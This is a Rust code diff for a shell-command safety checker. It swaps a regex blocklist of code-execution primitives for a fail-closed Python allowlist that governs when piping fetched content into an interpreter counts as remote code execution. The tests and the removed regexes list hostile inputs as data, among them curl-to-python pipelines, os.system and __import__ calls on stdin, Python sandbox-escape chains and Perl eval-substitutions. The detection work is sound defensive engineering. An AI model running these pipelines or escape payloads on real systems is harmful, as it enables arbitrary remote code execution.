@@ -106,7 +106,7 @@ pub struct CommandAnalysis {
     /// flag the RCE rule keys on.
     pub has_remote_source_to_interpreter: bool,
     /// Byte ranges of pipeline stages (after the first) verified to be an
-    /// interpreter running an inline literal script. The text backstop rule
+    /// Python interpreter running allowlisted literal code. The text backstop rule
     /// `curl-pipe-python` is evaluated with these masked out.
     pub inline_script_ranges: Vec<Range<usize>>,
     /// Raw AST parse succeeded
@@ -564,7 +564,7 @@ fn interpreter_kind(name: &str) -> Option<Interp> {
 /// Whether a pipeline-stage command runs its stdin as code: a shell, a bare
 /// interpreter (`python3`, `python3 -`, `python3 script.py`), or an
 /// interpreter behind a wrapper (`xargs python3 -c`, `env python3 …`). An
-/// interpreter invoked directly with an inline literal script reads stdin as
+/// Python interpreter invoked directly with allowlisted literal code reads stdin as
 /// data; its range is recorded in `inline_ranges` and it does not count.
 fn runs_stdin_as_code(node: &Node, source: &str, inline_ranges: &mut Vec<Range<usize>>) -> bool {
     let Some(cmd) = extract_command(node, source) else {
@@ -619,8 +619,8 @@ fn contains_kind(node: &Node, kinds: &[&str]) -> bool {
 ///   or backslash escapes, which bash decodes after we look (`\--interactive`);
 /// - after the code, only plain non-flag words, except for Python (its `-c`
 ///   ends option parsing; later words are `sys.argv`);
-/// - the code holds no obvious code-execution, REPL or debugger primitive
-///   (`exec`, `pickle`, `breakpoint()`, `binding.irb`, Perl `s///ee`).
+/// - Python code must parse within the explicit data-processing allowlist;
+///   other interpreter families have no inline-code exemption.
 fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
     // (normalized text, plain literal?) per argument, in order.
     let mut args: Vec<(String, bool)> = Vec::new();
@@ -678,7 +678,7 @@ fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
         }
         i += 1 + operands;
     };
-    if inline_code_executes_code(kind, code) {
+    if !inline_code_is_allowlisted(kind, code) {
         return false;
     }
     kind == Interp::Python || args[i..].iter().all(|(a, lit)| *lit && !a.starts_with('-'))
@@ -800,135 +800,11 @@ fn leading_flag_operands(kind: Interp, a: &str) -> Option<usize> {
     harmless.then_some(0)
 }
 
-/// Primitives that would turn fetched stdin back into code: code execution,
-/// deserializers that run code, and REPLs/debuggers that read program text
-/// from stdin. Not exhaustive: a determined literal can still run its input.
-/// It keeps the obvious forms (`exec(sys.stdin.read())`, `pickle.loads`,
-/// `breakpoint()`, `eval <STDIN>`, `s/.*/$&/e`) blocked under the RCE rule
-/// even when the content packs are disabled. Word-bounded, so ordinary
-/// strings (`"executive"`) and static imports (`require "json"`) pass.
-fn inline_code_executes_code(kind: Interp, code: &str) -> bool {
-    static COMMON: Lazy<regex::Regex> = Lazy::new(|| {
-        regex::Regex::new(concat!(
-            r"(?:\b|_)(exec|eval)\b",
-            r"|\bexec(v|l|vp|lp|ve|le|vpe|lpe|Sync|File|FileSync)\b",
-            r"|(?:\b|_)w?spawn(p|v|l|vp|lp|ve|le|vpe|lpe|Sync|File|FileSync)?\b",
-            r"|\b(system|popen|subprocess|child_process|pickle|marshal|shelve|dill|joblib",
-            r"|runpy|interact|InteractiveConsole|InteractiveInterpreter|breakpoint|pdb",
-            r"|set_trace|debugger|repl|inspector|irb|pry)\b",
-            r"|yaml\.(unsafe_)?load\b",
-        ))
-        .unwrap()
-    });
-    static RUBY: Lazy<regex::Regex> = Lazy::new(|| {
-        regex::Regex::new(concat!(
-            r"\bopen\b|%x|`|\bsyscall\b|\bfork\b|\bload\b",
-            r"|\bbinding\s*[.(]",
-            r"|\b(send|__send__|public_send)\s*(?:\(|:)",
-            r"|\brequire(?:_relative)?\s*\(?\s*['\x22](?:/dev/stdin|/dev/fd/0|/proc/self/fd/0|-)['\x22]",
-        ))
-        .unwrap()
-    });
-    static PERL: Lazy<regex::Regex> = Lazy::new(|| {
-        regex::Regex::new(concat!(
-            r"\bopen\b|\bqx\b|`|\bsyscall\b",
-            r"|\b(do|require)\s*\(?\s*(?:[$'\x22<]|qq?(?:[^\w\s]|\s+\S))",
-        ))
-        .unwrap()
-    });
-    static NODE: Lazy<regex::Regex> = Lazy::new(|| {
-        regex::Regex::new(r"\bFunction\b|\bvm\b|\bimport\s*\(|\bWorker\b|_compile\b").unwrap()
-    });
-    static PHP: Lazy<regex::Regex> = Lazy::new(|| {
-        regex::Regex::new(
-            r"passthru|proc_open|shell_exec|\binclude|\brequire|\bassert\b|create_function|preg_replace|`",
-        )
-        .unwrap()
-    });
-    COMMON.is_match(code)
-        || match kind {
-            Interp::Ruby => RUBY.is_match(code),
-            Interp::Perl => PERL.is_match(code) || perl_substitution_executes_code(code),
-            Interp::Node => NODE.is_match(code),
-            Interp::Php => PHP.is_match(code),
-            Interp::Python | Interp::Shell => false,
-        }
-}
-
-/// Scan Perl substitutions independently of the chosen delimiter. Paired
-/// delimiters nest, escaped delimiters don't close a part, and the replacement
-/// can use a different delimiter from the pattern (`s{a}[b]e`). Any `e` modifier
-/// executes code, including `ee` and longer runs. Uncertain syntax fails closed
-/// when a possible delimiter is followed by an e-containing modifier run.
-fn perl_substitution_executes_code(code: &str) -> bool {
-    static START: Lazy<regex::Regex> = Lazy::new(|| regex::Regex::new(r"\bs\s*").unwrap());
-    static UNCERTAIN_E: Lazy<regex::Regex> =
-        Lazy::new(|| regex::Regex::new(r"[^\w\s][a-zA-Z]*e[a-zA-Z]*\b").unwrap());
-    fn closing(open: char) -> char {
-        match open {
-            '{' => '}',
-            '(' => ')',
-            '[' => ']',
-            '<' => '>',
-            _ => open,
-        }
-    }
-    fn end(chars: &[char], start: usize, open: char, close: char) -> Option<usize> {
-        let mut depth = 1;
-        let mut i = start;
-        while let Some(&c) = chars.get(i) {
-            if c == '\\' {
-                i += 2;
-                continue;
-            }
-            if c == close {
-                depth -= 1;
-                if depth == 0 {
-                    return Some(i + 1);
-                }
-            } else if open != close && c == open {
-                depth += 1;
-            }
-            i += 1;
-        }
-        None
-    }
-    for op in START.find_iter(code) {
-        let tail = &code[op.end()..];
-        let chars: Vec<_> = tail.chars().collect();
-        let Some(&open) = chars.first() else {
-            continue;
-        };
-        // An adjoining word is an identifier, not a substitution operator.
-        if (open.is_alphanumeric() || open == '_') && op.as_str() == "s" {
-            continue;
-        }
-        let close = closing(open);
-        let modifiers = end(&chars, 1, open, close).and_then(|mut i| {
-            if open != close {
-                while chars.get(i).is_some_and(|c| c.is_whitespace()) {
-                    i += 1;
-                }
-                let &replacement_open = chars.get(i)?;
-                end(&chars, i + 1, replacement_open, closing(replacement_open))
-            } else {
-                end(&chars, i, open, close)
-            }
-        });
-        match modifiers {
-            Some(i)
-                if chars[i..]
-                    .iter()
-                    .take_while(|c| c.is_ascii_alphabetic())
-                    .any(|c| *c == 'e') =>
-            {
-                return true;
-            }
-            None if UNCERTAIN_E.is_match(tail) => return true,
-            _ => {}
-        }
-    }
-    false
+/// Fail closed: only Python has a tokenized, restricted data-processing grammar.
+/// Ruby, Perl, Node and PHP have no exemption: their execution/interpolation
+/// semantics need separate parsers before they can be safely allowlisted.
+fn inline_code_is_allowlisted(kind: Interp, code: &str) -> bool {
+    kind == Interp::Python && super::inline_python::is_allowlisted(code)
 }
 
 /// `command` with each range replaced by a neutral token, for running text
@@ -1059,19 +935,22 @@ mod tests {
     }
 
     #[test]
-    fn test_perl_substitution_e_modifiers_with_any_delimiter() {
+    fn test_perl_substitutions_have_no_exemption_with_any_delimiter() {
         for delimiter in [
             '/', '~', ':', '!', '#', '|', '%', '@', '?', '=', ';', ',', '.', '+', '-', '^', '&',
             '*', '"', '\'', ')', ']', '}', '>', '§',
         ] {
             for modifiers in ["e", "ee", "eee", "igee"] {
                 let code = format!("s{delimiter}a{delimiter}1{delimiter}{modifiers}");
-                assert!(perl_substitution_executes_code(&code), "must block: {code}");
+                assert!(
+                    !inline_code_is_allowlisted(Interp::Perl, &code),
+                    "must block: {code}"
+                );
             }
             let code = format!("s{delimiter}a{delimiter}b{delimiter}g");
             assert!(
-                !perl_substitution_executes_code(&code),
-                "data substitution: {code}"
+                !inline_code_is_allowlisted(Interp::Perl, &code),
+                "no Perl exemption: {code}"
             );
         }
         for code in [
@@ -1087,7 +966,10 @@ mod tests {
             "s _.*_$&_ee",
             "s{uncertain}/ee",
         ] {
-            assert!(perl_substitution_executes_code(code), "must block: {code}");
+            assert!(
+                !inline_code_is_allowlisted(Interp::Perl, code),
+                "must block: {code}"
+            );
         }
         for code in [
             "print if /x/",
@@ -1098,8 +980,8 @@ mod tests {
             r"s~a\~b~c~g",
         ] {
             assert!(
-                !perl_substitution_executes_code(code),
-                "data substitution: {code}"
+                !inline_code_is_allowlisted(Interp::Perl, code),
+                "no Perl exemption: {code}"
             );
         }
     }
@@ -1142,7 +1024,7 @@ mod tests {
                 format!("require('{path}')"),
             ] {
                 assert!(
-                    inline_code_executes_code(Interp::Ruby, &code),
+                    !inline_code_is_allowlisted(Interp::Ruby, &code),
                     "must block: {code}"
                 );
             }
@@ -1160,22 +1042,25 @@ mod tests {
                 ] {
                     let code = format!("{loader} {operand}");
                     assert!(
-                        inline_code_executes_code(Interp::Perl, &code),
+                        !inline_code_is_allowlisted(Interp::Perl, &code),
                         "must block: {code}"
                     );
                 }
             }
         }
-        assert!(inline_code_executes_code(Interp::Ruby, "load 'script.rb'"));
-        assert!(!inline_code_executes_code(
+        assert!(!inline_code_is_allowlisted(
+            Interp::Ruby,
+            "load 'script.rb'"
+        ));
+        assert!(!inline_code_is_allowlisted(
             Interp::Ruby,
             "require \"json\"; puts JSON.parse(STDIN.read)"
         ));
-        assert!(!inline_code_executes_code(
+        assert!(!inline_code_is_allowlisted(
             Interp::Perl,
             "use JSON; print decode_json(<STDIN>);"
         ));
-        assert!(!inline_code_executes_code(
+        assert!(!inline_code_is_allowlisted(
             Interp::Perl,
             "require JSON; print <STDIN>;"
         ));
@@ -1200,11 +1085,11 @@ mod tests {
             "_wspawnlpe(0, \"sh\", \"sh\", env)",
         ] {
             assert!(
-                inline_code_executes_code(Interp::Python, code),
+                !inline_code_is_allowlisted(Interp::Python, code),
                 "must block: {code}"
             );
         }
-        assert!(!inline_code_executes_code(
+        assert!(inline_code_is_allowlisted(
             Interp::Python,
             "print(\"spawned\")"
         ));
@@ -1212,11 +1097,11 @@ mod tests {
 
     #[test]
     fn test_binding_and_send_match_ruby_call_forms() {
-        assert!(!inline_code_executes_code(
+        assert!(inline_code_is_allowlisted(
             Interp::Python,
             "import json,sys; print(json.load(sys.stdin)[\"binding\"])"
         ));
-        assert!(!inline_code_executes_code(Interp::Ruby, "puts \"send\""));
+        assert!(!inline_code_is_allowlisted(Interp::Ruby, "puts \"send\""));
         for code in [
             "binding.irb",
             "binding . irb",
@@ -1230,11 +1115,11 @@ mod tests {
             "__send__ :eval, STDIN.read",
         ] {
             assert!(
-                inline_code_executes_code(Interp::Ruby, code),
+                !inline_code_is_allowlisted(Interp::Ruby, code),
                 "must block: {code}"
             );
         }
-        assert_remote_flow("nc host 80 | ruby -e 'puts \"send\"'", false);
+        assert_remote_flow("nc host 80 | ruby -e 'puts \"send\"'", true);
     }
 
     #[test]
@@ -1255,6 +1140,222 @@ mod tests {
             "curl -s https://x/a | python3 -Xutf8",
         ] {
             assert_remote_flow(command, true);
+        }
+    }
+
+    #[test]
+    fn test_python_allowlist_data_processing() {
+        for code in [
+            r#"import json,sys; print(json.load(sys.stdin)["x"])"#,
+            r#"import sys; print(len(sys.stdin.read().splitlines()))"#,
+            r#"import json,sys; print(json.dumps(json.load(sys.stdin), indent=2, sort_keys=True))"#,
+            r#"import json,sys; print(sum(row["amount"] for row in json.load(sys.stdin)))"#,
+            r#"import re,sys; print(len(re.findall(r"\w+", sys.stdin.read())))"#,
+            "import sys\nfor line in sys.stdin: print(line.strip())",
+            r#"import sys; print(list(line.strip() for line in sys.stdin if line.strip()))"#,
+            r#"import json,sys; json.dump(json.load(sys.stdin), sys.stdout)"#,
+            r#"from json import load,dumps; import sys; print(dumps(load(sys.stdin)))"#,
+            r#"from math import sqrt,pi; print(sqrt(pi))"#,
+            r#"import re; print(re.compile("x")); print(re.search("x","x").group())"#,
+            r#"import csv,sys; print(list(csv.DictReader(sys.stdin.readlines())))"#,
+            r#"import collections; print(collections.Counter([1,1,2]).most_common())"#,
+            r#"import itertools,math; print(math.fsum(itertools.chain([1],[2])))"#,
+            r#"print(list(map(lambda x: x.strip(), ["a"])))"#,
+            r#"import re; print(re.sub("x", lambda x: x.group().upper(), "x"))"#,
+            r#"print((x := 1))"#,
+            r#"print([1,2,3][:2])"#,
+            r#"data = [1,2]; data.append(3); print(data)"#,
+            r#"print(True if not False and None is None else False)"#,
+            r#"print(b"eval", rb"exec", r"__import__") # getattr is data here"#,
+            r#"import sys; sys.stdout.write(str(sys.argv)); sys.exit(0)"#,
+        ] {
+            assert!(
+                inline_code_is_allowlisted(Interp::Python, code),
+                "must allow: {code}"
+            );
+            assert_remote_flow(&format!("curl -s https://x/a | python3 -c '{code}'"), false);
+        }
+        assert_remote_flow(
+            "curl -s https://x/a | python3 -c \"import sys; print(len(sys.stdin.read().splitlines()))\"",
+            false,
+        );
+    }
+
+    #[test]
+    fn test_python_allowlist_adversarial_and_unknown_syntax() {
+        for code in [
+            r#"getattr(getattr(sys,"modules")["os"],"system")(sys.stdin.read())"#,
+            r#"__import__("os").system(sys.stdin.read())"#,
+            r#"().__class__.__mro__[1].__subclasses__()"#,
+            r#"getattr(sys, "".join(map(chr,[109,111,100,117,108,101,115])))"#,
+            r#"import sys; print(sys.modules)"#,
+            r#"import os; print(os.name)"#,
+            r#"import subprocess; subprocess.run([])"#,
+            r#"open("/dev/stdin").read()"#,
+            r#"print(f"{eval(sys.stdin.read())}")"#,
+            r#"print(f"{1}")"#,
+            r#"print(fr"{1}")"#,
+            r#"print(\u0065val(sys.stdin.read()))"#,
+            r#"print(compile(sys.stdin.read(), "x", "exec"))"#,
+            r#"print(type(1))"#,
+            r#"print(list(map(lambda x: eval(x), [])))"#,
+            r#"print((x := eval(sys.stdin.read())))"#,
+            r#"print((unknown := 1))"#,
+            r#"print(unknown)"#,
+            r#"print(ｅval(1))"#,
+            r#"print(1).unknown()"#,
+            r#"import json; json.unknown()"#,
+            r#"import sys; print(sys.stdin.buffer.read())"#,
+            r#"import sys; print(sys.stdin)"#,
+            r#"import sys; data = sys.stdin"#,
+            r#"import sys; print(list(sys.stdin))"#,
+            r#"import sys; print(sys.stdout)"#,
+            r#"import json; json.loads("null")()"#,
+            r#"data = print; data(1)"#,
+            r#"print(getattr)"#,
+            r#"from os import system"#,
+            r#"from re import compile; compile("x")"#,
+            r#"from json import __builtins__"#,
+            r#"from math import *"#,
+            r#"import json as x"#,
+            r#"print(u"x")"#,
+            r#"print(t"x")"#,
+            r#"print("""x""")"#,
+            r#"print("unterminated)"#,
+            r#"print("\xGG")"#,
+            r#"print("\u00")"#,
+            r#"print("\Uffffffff")"#,
+            r#"print(b"é")"#,
+            " print(1)",
+            "print(1)\n print(2)",
+            "import sys; for line in sys.stdin: print(line)",
+            "print(1",
+            "print([1))",
+            "print(1) unknown",
+            "print(1);;print(2)",
+            "print(indent=2,1)",
+            "print(end=1,end=2)",
+            "print((x+row := 1))",
+            "print({1:2,3})",
+            "print({1,2:3})",
+            "print(x[:::])",
+            "print(1 + lambda x: x)",
+            "print(1 + not True)",
+            "@print",
+            "`print(1)`",
+            "print(1)\\\n",
+            "def x(): print(1)",
+            "class x: print(1)",
+            "with x: print(1)",
+            "try: print(1)",
+            "global x",
+            "nonlocal x",
+            "yield 1",
+            "await x",
+            "del x",
+            "import sys; sys.stdin = 1",
+            "print = 1",
+            "import math; math.__dict__",
+            "import itertools; itertools.unknown()",
+            ".é",
+            "1 + é",
+            "print(1) + é",
+        ] {
+            assert!(
+                !inline_code_is_allowlisted(Interp::Python, code),
+                "must block: {code}"
+            );
+            assert_remote_flow(&format!("curl -s https://x/a | python3 -c '{code}'"), true);
+        }
+    }
+
+    #[test]
+    fn test_dangerous_identifiers_rejected_in_allowlisted_contexts() {
+        let names = [
+            "getattr",
+            "chr",
+            "setattr",
+            "delattr",
+            "hasattr",
+            "vars",
+            "globals",
+            "locals",
+            "dir",
+            "type",
+            "object",
+            "compile",
+            "open",
+            "input",
+            "exec",
+            "eval",
+            "__import__",
+            "breakpoint",
+            "help",
+            "memoryview",
+            "classmethod",
+            "staticmethod",
+            "super",
+            "property",
+            "os",
+            "subprocess",
+            "pickle",
+            "marshal",
+            "shelve",
+            "dill",
+            "joblib",
+            "runpy",
+            "ctypes",
+            "pdb",
+            "code",
+            "builtins",
+            "__builtins__",
+            "__class__",
+            "__mro__",
+            "__subclasses__",
+            "unknown",
+            "execfile",
+            "reload",
+        ];
+        for name in names {
+            for code in [
+                format!("import sys; print({name})"),
+                format!("import sys; {name}(sys.stdin.read())"),
+                format!("print(list(map(lambda x: {name}(x), [])))"),
+                format!("print((x := {name}(1)))"),
+                format!("print(1); {name} = 1"),
+                format!("import sys; print(sys.{name})"),
+            ] {
+                assert!(
+                    !inline_code_is_allowlisted(Interp::Python, &code),
+                    "must block: {code}"
+                );
+                assert_remote_flow(&format!("curl -s https://x/a | python3 -c '{code}'"), true);
+            }
+        }
+    }
+
+    #[test]
+    fn test_only_python_has_an_inline_allowlist() {
+        for kind in [
+            Interp::Shell,
+            Interp::Ruby,
+            Interp::Perl,
+            Interp::Node,
+            Interp::Php,
+        ] {
+            for code in ["", "1", "print(1)", "console.log(JSON.parse(input))"] {
+                assert!(!inline_code_is_allowlisted(kind, code), "{kind:?}: {code}");
+            }
+        }
+    }
+
+    #[test]
+    fn test_python_allowlist_work_is_bounded() {
+        let deep = format!("print({}1{})", "(".repeat(100), ")".repeat(100));
+        let long = "print(1);".repeat(2000);
+        let unary = format!("print({}1)", "-".repeat(100));
+        for code in [deep, long, unary] {
+            assert!(!inline_code_is_allowlisted(Interp::Python, &code));
         }
     }
 
